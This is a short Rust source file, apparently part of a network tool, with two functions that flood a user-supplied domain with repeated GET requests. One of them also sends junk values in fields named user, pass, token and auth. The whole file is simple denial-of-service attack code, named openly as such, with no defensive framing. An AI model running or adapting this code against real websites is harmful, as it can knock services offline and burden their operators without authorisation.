use crate::core::core::*;
use crate::modules::network::structs::*;
use std::collections::HashMap;

pub fn seach_number_value(key: &str, argsv: &[String]) -> i32 {
    search_value(key, argsv).parse::<i32>().unwrap_or(0)
}

pub fn dos_simple_get_span(argsv: &[String]) -> i32 {
    let mut req = Request::new();

    let mut vurl = search_value("domain", argsv);
    if !vurl.contains("http://") && !vurl.contains("https://") {
        vurl = format!("https://{}", vurl);
    }

    req.url = vurl;
    req.method = "GET".to_string();

    let times = seach_number_value("times", argsv);

    for _i in 0..times {
        let out = req.make();
        println!("{} - {}", out.url, out.status);
    }
    return 0;
}

pub fn dos_long_auth_span(argsv: &[String]) -> i32 {
    // let size = seach_number_value("size", argsv);
    let seed = "3l34_=3k4vç~4vu,,20-v";
    let mut req = Request::new();

    let mut vurl = search_value("domain", argsv);
    if !vurl.contains("http://") && !vurl.contains("https://") {
        vurl = format!("https://{}", vurl);
    }

    req.url = vurl;

    req.method = "GET".to_string();
    req.body = Some(HashMap::from([
        ("user", seed),
        ("pass", seed),
        ("username", seed),
        ("password", seed),
        ("token", seed),
        ("auth", seed),
    ]));

    let times = seach_number_value("times", argsv);

    for _i in 0..times {
        let out = req.make();
        println!("{} - {}", out.url, out.status);
    }
    0
}
